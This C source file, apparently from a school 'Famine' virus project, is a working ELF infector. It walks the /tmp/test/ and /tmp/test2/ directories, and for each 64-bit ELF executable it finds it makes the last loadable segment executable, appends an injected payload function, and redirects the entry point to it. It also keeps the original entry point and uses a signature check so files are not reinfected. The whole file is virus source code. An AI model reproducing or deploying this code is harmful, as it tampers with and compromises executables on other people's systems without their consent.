/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
/*   Updated: 2018/05/30 06:42:16 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <elf.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "ft_printf.h"

#define OPEN		2
#define CLOSE		3
#define LSEEK		8
#define MMAP		9
#define MUNMAP		11
#define UNLINK		87
#define GETDENTS64	217


void			find_files(char *dir);
void			get_dat_elf(char *dir, char *file);
void			pack_dat_elf(char *path, int size, char *data);
int				check_signature(char *data, Elf64_Phdr *iprogram);
void			famine64_func(void);
extern uint32_t	famine64_size;


struct linux_dirent64 {
	ino_t          d_ino;    /* 64-bit inode number */
	off_t          d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};

int main(int ac, char **av)
{
	char	*direct[] = { "/tmp/test/", "/tmp/test2/" };

	find_files(direct[0]);
	find_files(direct[1]);
	return 0;
}

void	find_files(char *dir)
{
	int		fd;
	char	buff[1024];
	int		ret;
	int		off;
	
	fd = syscall(OPEN, dir, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0);
	if (fd == -1)
		return ;
	while ((ret = syscall(GETDENTS64, fd, buff, 1024)) > 0)
	{
		off = 0;
		while (off < ret)
		{
			if (*(buff + off + 8+8+2) == DT_REG)
				get_dat_elf(dir, buff + off + 8+8+2+1);
			off = off + *(buff + off + 16);
		}
	}
	syscall(CLOSE, fd);
}

void	get_dat_elf(char *dir, char *file)
{
	char	path[1024];
	int		fd;
	int		size;
	void	*data;
	int		i;
	int		j;

	i = 0;
	while (dir[i])
	{
		path[i] = dir[i];
		i++;
	}
	j = 0;
	while (file[j])
	{
		path[i + j] = file[j];
		j++;
	}
	path[i + j] = '\0';
	fd = syscall(OPEN, path, O_RDWR|O_NONBLOCK, 0);
	if (fd == -1){
		write(1, "OPEN file failed\n", 17);
		return ;
	}
	size = syscall(LSEEK, fd, 1, SEEK_END);
	if (size <= 0)
	{
		write(1, "SEEK file failed\n", 17);
		syscall(CLOSE, fd);
		return ;
	}

	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (data == MAP_FAILED)
	{
		write(1, "MMAP file failed\n", 17);
		syscall(CLOSE, fd);
		return ;
	}
	syscall(CLOSE, fd);
	pack_dat_elf(path, size, data);
	syscall(MUNMAP, data, size);
}

void		pack_dat_elf(char *path, int size, char *data)
{
	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F'	&&
		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
		// Ajouter le check de signature de binaire
	{

		/* 1. Find the highest memory mapped PT_LOAD segment */
		size_t	phoff = ((Elf64_Ehdr *)data)->e_phoff;
		Elf64_Phdr *program = (Elf64_Phdr *)(data + phoff);
		Elf64_Phdr *iprogram = NULL;
		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
			if (program[i].p_type == PT_LOAD) {
				if (!iprogram ||
					program[i].p_vaddr > iprogram->p_vaddr) {
					iprogram = &program[i];
				}
			}
		}
		if (iprogram == NULL)
			return ;
		if (check_signature(data, iprogram))
			return ;

		/* Extra: Change the offset of sections higher than our code offset, for debug. */
		syscall(UNLINK, path);

		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
			if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_memsz) {
				section[i].sh_offset += famine64_size;
			}
		}

		/* 2. Compute the virtual address of our code */
		Elf64_Addr new_entry = iprogram->p_vaddr + iprogram->p_memsz;

		/* 3. Change the elf header */
		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
		((Elf64_Ehdr *)data)->e_entry = new_entry;
		((Elf64_Ehdr *)data)->e_shoff += famine64_size;

		/* 4. Change the program header */
		if ((iprogram->p_flags & PF_X) == 0)
			iprogram->p_flags |= PF_X;
		iprogram->p_memsz += famine64_size;
		iprogram->p_filesz = iprogram->p_memsz;

		int fd = syscall(OPEN, path, O_WRONLY|O_CREAT, 0755);
		if (fd == -1){
			write(1, "OPEN file failed\n", 17);
			return ;
		}
		/* Get the offset in file to write our code */
		size_t off = iprogram->p_offset + iprogram->p_memsz - famine64_size;
		if (write(fd, data, off) < 0)
			return ;
		if (write(fd, &famine64_func, famine64_size - sizeof(old_entry)) < 0)
			return ;
		if (write(fd, &old_entry, sizeof(old_entry)) < 0)
			return ;
		if (write(fd, data + off, size - off) < 0)
			return ;
		syscall(CLOSE, fd);
	}
}

int		check_signature(char *data, Elf64_Phdr *iprogram)
{
	char *ptr = (data + iprogram->p_offset + iprogram->p_memsz - 16);
	uint32_t sign = *(uint32_t*)ptr;
	ptr = (data + iprogram->p_offset + iprogram->p_memsz - 12);
	uint32_t sign4 = *(uint32_t*)ptr;
	return (sign == 0x42CAFE42 && sign4 == 0x24EFAC24);
}

/*

		typedef struct
		{
16			unsigned char e_ident[EI_NIDENT];
2			Elf64_Half    e_type;
2			Elf64_Half    e_machine;
4			Elf64_Word    e_version;
8			Elf64_Addr    e_entry;
8			Elf64_Off e_phoff;
8			Elf64_Off e_shoff;
4			Elf64_Word    e_flags;
2			Elf64_Half    e_ehsize;
2			Elf64_Half    e_phentsize;
2			Elf64_Half    e_phnum;
2			Elf64_Half    e_shentsize;
2			Elf64_Half    e_shnum;
2			Elf64_Half    e_shstrndx;
		} Elf64_Ehdr;

		typedef struct
		{
4			Elf64_Word    p_type;
4			Elf64_Word    p_flags;
8			Elf64_Off     p_offset;
8			Elf64_Addr    p_vaddr;
8			Elf64_Addr    p_paddr;
8			Elf64_Xword   p_filesz;
8			Elf64_Xword   p_memsz;
8			Elf64_Xword   p_align;
56		} Elf64_Phdr;

		typedef struct
		{
4			Elf64_Word    sh_name;
4			Elf64_Word    sh_type;
8			Elf64_Xword   sh_flags;
8			Elf64_Addr    sh_addr;
8			Elf64_Off     sh_offset;
8			Elf64_Xword   sh_size;
4			Elf64_Word    sh_link;
4			Elf64_Word    sh_info;
8			Elf64_Xword   sh_addralign;
8			Elf64_Xword   sh_entsize;
64		} Elf64_Shdr;
*/
